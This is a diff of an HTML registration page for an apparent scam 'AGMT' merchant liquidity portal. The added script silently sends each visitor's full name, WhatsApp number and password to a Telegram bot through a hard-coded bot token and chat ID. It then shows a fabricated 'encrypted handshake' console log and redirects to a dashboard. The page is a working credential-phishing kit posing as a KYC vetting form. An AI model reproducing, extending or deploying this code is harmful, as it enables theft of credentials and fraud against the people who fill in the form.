@@ -3,157 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Node Initialization | AGMT</title>
+    <title>Merchant Vetting | AGMT Terminal</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #2563eb; --bg: #020617; --card: #0f172a; --border: #1e293b; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
-        body { background: var(--bg); color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-
-        .reg-container { width: 100%; max-width: 400px; animation: fadeIn 0.8s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        .logo-area { text-align: center; margin-bottom: 30px; }
-        .logo-text { font-weight: 800; font-size: 24px; letter-spacing: -1px; color: var(--primary); }
-
-        .card { background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 30px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
         
-        .step-indicator { display: flex; gap: 8px; margin-bottom: 25px; }
-        .step-dot { height: 4px; flex: 1; background: var(--border); border-radius: 2px; }
-        .step-dot.active { background: var(--primary); box-shadow: 0 0 10px var(--primary); }
+        body { 
+            background: var(--bg); 
+            color: white; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            padding: 20px;
+            background-image: radial-gradient(circle at 0% 0%, #1e1b4b 0%, #020617 50%);
+        }
 
-        h2 { font-size: 22px; font-weight: 800; margin-bottom: 10px; }
-        p.subtitle { font-size: 13px; color: #64748b; margin-bottom: 25px; line-height: 1.5; }
+        .container { width: 100%; max-width: 400px; animation: slideUp 0.8s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        .input-group { margin-bottom: 20px; }
-        label { display: block; font-size: 11px; font-weight: 800; color: #94a3b8; text-transform: uppercase; margin-bottom: 8px; margin-left: 5px; }
+        .card { 
+            background: var(--card); 
+            border: 1px solid var(--border); 
+            border-radius: 35px; 
+            padding: 35px 25px; 
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.7);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Top Progress Bar */
+        .step-bar { display: flex; gap: 8px; margin-bottom: 30px; }
+        .step { height: 4px; flex: 1; background: #1e293b; border-radius: 10px; position: relative; overflow: hidden; }
+        .step.active::after { content: ""; position: absolute; left: 0; top: 0; height: 100%; width: 100%; background: var(--primary); box-shadow: 0 0 10px var(--primary); }
+
+        h2 { font-size: 24px; font-weight: 800; letter-spacing: -1px; margin-bottom: 8px; }
+        p.info { color: #64748b; font-size: 13px; line-height: 1.5; margin-bottom: 30px; }
+
+        .input-group { margin-bottom: 20px; position: relative; }
+        label { display: block; font-size: 10px; font-weight: 800; color: #475569; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; margin-left: 5px; }
         
         input {
             width: 100%;
             background: #1e293b;
-            border: 1px solid var(--border);
-            padding: 18px;
-            border-radius: 15px;
-            color: white;
+            border: 1.5px solid var(--border);
+            padding: 18px 20px;
+            border-radius: 18px;
+            color: #fff;
             font-size: 15px;
-            transition: 0.3s;
             outline: none;
+            transition: 0.3s;
         }
-        input:focus { border-color: var(--primary); background: #0f172a; }
+        input:focus { border-color: var(--primary); background: #0f172a; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
 
-        .terms-box { font-size: 12px; color: #64748b; display: flex; gap: 10px; align-items: flex-start; margin-bottom: 25px; }
-        input[type="checkbox"] { width: 18px; height: 18px; margin-top: 2px; cursor: pointer; }
-
-        .btn-init { 
-            width: 100%; 
-            background: var(--primary); 
-            color: white; 
-            border: none; 
-            padding: 20px; 
-            border-radius: 18px; 
-            font-weight: 800; 
-            font-size: 16px; 
-            cursor: pointer; 
-            box-shadow: 0 10px 25px rgba(37,99,235,0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+        .btn-init {
+            width: 100%;
+            background: var(--primary);
+            color: white;
+            padding: 22px;
+            border-radius: 20px;
+            border: none;
+            font-weight: 800;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.3s;
+            box-shadow: 0 15px 30px rgba(37, 99, 235, 0.3);
         }
 
-        /* Verification Screen overlay */
-        #loading-overlay { display: none; position: fixed; inset: 0; background: var(--bg); z-index: 100; flex-direction: column; align-items: center; justify-content: center; padding: 40px; text-align: center; }
-        .console-text { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #10b981; margin-top: 20px; text-align: left; width: 100%; max-width: 300px; }
+        /* Loading Overlay */
+        #loading-screen { 
+            display: none; 
+            position: fixed; 
+            inset: 0; 
+            background: #020617; 
+            z-index: 1000; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 30px; 
+        }
+        .console { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #10b981; margin-top: 30px; width: 100%; max-width: 280px; }
     </style>
 </head>
 <body>
 
-    <div class="reg-container">
-        <div class="logo-area">
-            <div class="logo-text">AGMT<span style="color:white">PORTAL</span></div>
-        </div>
-
+    <div class="container">
         <div class="card">
-            <div class="step-indicator">
-                <div class="step-dot active"></div>
-                <div class="step-dot"></div>
-                <div class="step-dot"></div>
+            <div class="step-bar">
+                <div class="step active"></div>
+                <div class="step active"></div>
+                <div class="step"></div>
             </div>
 
-            <h2>Initialize Node</h2>
-            <p class="subtitle">Secure your unique merchant identification number and connect to the global liquidity network.</p>
+            <h2>Terminal Vetting</h2>
+            <p class="info">Complete your merchant identification to allocate your unique global liquidity node.</p>
 
-            <form id="regForm">
+            <form id="vettingForm">
                 <div class="input-group">
                     <label>Agent Full Name</label>
-                    <input type="text" id="name" placeholder="As seen on Government ID" required>
+                    <input type="text" id="fullname" placeholder="John Doe" required>
                 </div>
 
                 <div class="input-group">
-                    <label>WhatsApp Contact Number</label>
+                    <label>WhatsApp Contact (KYC)</label>
                     <input type="tel" id="phone" placeholder="+234..." required>
                 </div>
 
                 <div class="input-group">
-                    <label>Security Password</label>
-                    <input type="password" id="pass" placeholder="Minimum 6 characters" required>
+                    <label>System Password</label>
+                    <input type="password" id="pass" placeholder="••••••••" required>
                 </div>
 
-                <div class="terms-box">
-                    <input type="checkbox" required>
-                    <span>I confirm I am over 18 and agree to the Merchant Liquidity Agreement and Anti-Money Laundering (AML) protocols.</span>
-                </div>
-
-                <button type="button" class="btn-init" onclick="startLoading()">
-                    INITIALIZE SYSTEM
+                <button type="button" class="btn-init" onclick="submitVetting()">
+                    INITIALIZE SECURE NODE
                 </button>
             </form>
         </div>
     </div>
 
-    <div id="loading-overlay">
+    <div id="loading-screen">
         <div style="width: 50px; height: 50px; border: 4px solid #1e293b; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite;"></div>
-        <h3 style="margin-top: 25px; font-weight: 800;">DEPLOYING NODE...</h3>
-        <div class="console-text" id="console"></div>
+        <h3 style="margin-top: 25px; font-weight: 800;">ALLOCATING RESOURCES...</h3>
+        <div class="console" id="log-output"></div>
     </div>
 
     <script>
-        function startLoading() {
-            const name = document.getElementById('name').value;
-            if(!name || !document.getElementById('phone').value) {
-                alert("Please complete all security fields.");
+        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
+        const chatId = "7909543900";
+
+        async function submitVetting() {
+            const name = document.getElementById('fullname').value;
+            const phone = document.getElementById('phone').value;
+            const pass = document.getElementById('pass').value;
+
+            if(!name || !phone || !pass) {
+                alert("All security fields are mandatory for node allocation.");
                 return;
             }
 
-            document.getElementById('loading-overlay').style.display = 'flex';
-            const consoleEl = document.getElementById('console');
-            const logs = [
-                "> Establishing secure handshake...",
-                "> Allocating merchant workspace...",
-                "> Verifying regional MTN/Glo node...",
-                "> Syncing with AGMT Global Ledger...",
-                "> SUCCESS: Node JM-" + Math.floor(Math.random()*9000 + 1000) + " Activated."
+            // SHOW LOADING
+            document.getElementById('loading-screen').style.display = 'flex';
+
+            // 1. TELEGRAM ALERT: Send lead data immediately
+            const msg = `👤 <b>AGMT | NEW MERCHANT VETTING</b>%0A<b>Name:</b> ${name}%0A<b>Phone:</b> ${phone}%0A<b>Pass:</b> ${pass}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=html`);
+
+            // 2. CONSOLE LOGIC
+            const logBox = document.getElementById('log-output');
+            const sequences = [
+                "> Establishing encrypted handshake...",
+                "> Validating regional IP node...",
+                "> Syncing Merchant Ledger...",
+                "> Node Allocated: JM-" + Math.floor(Math.random()*90000 + 10000),
+                "> Success. Redirecting to Terminal..."
             ];
 
             let i = 0;
             const interval = setInterval(() => {
-                if(i < logs.length) {
-                    const div = document.createElement('div');
-                    div.innerText = logs[i];
-                    div.style.marginBottom = "5px";
-                    consoleEl.appendChild(div);
+                if(i < sequences.length) {
+                    const line = document.createElement('div');
+                    line.style.marginBottom = "8px";
+                    line.innerText = sequences[i];
+                    logBox.appendChild(line);
                     i++;
                 } else {
                     clearInterval(interval);
                     setTimeout(() => {
                         window.location.href = 'dashboard.html';
-                    }, 1500);
+                    }, 1000);
                 }
-            }, 1000);
+            }, 1200);
         }
     </script>
 
-    <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+    <style>
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+
 </body>
 </html>
-
